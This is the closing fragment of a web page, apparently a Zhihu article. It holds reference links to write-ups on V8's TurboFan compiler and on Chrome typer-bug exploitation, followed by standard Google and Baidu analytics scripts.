wrap external" target="_blank" rel="nofollow noreferrer">Introduction to TurboFan</a><a href="https://link.zhihu.com/?target=https%3A//abiondo.me/2019/01/02/exploiting-math-expm1-v8/" class=" wrap external" target="_blank" rel="nofollow noreferrer">↩</a></p><p><a href="https://link.zhihu.com/?target=https%3A//doar-e.github.io/blog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs/" class=" wrap external" target="_blank" rel="nofollow noreferrer">Circumventing Chrome&#39;s hardening of typer bugs</a></p>
<script async defer="defer" src="https://www.googletagmanager.com/gtag/js?id=UA-7909075-5"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){ dataLayer.push(arguments); }
gtag('js', new Date());
gtag('config', 'UA-7909075-5');
</script>
<script>
var _hmt = _hmt || [];
</script>
<script async defer="defer" src="https://hm.baidu.com/hm.js?e3d40295e416616ddc21287da9646d31"></script>
</body>
</html>
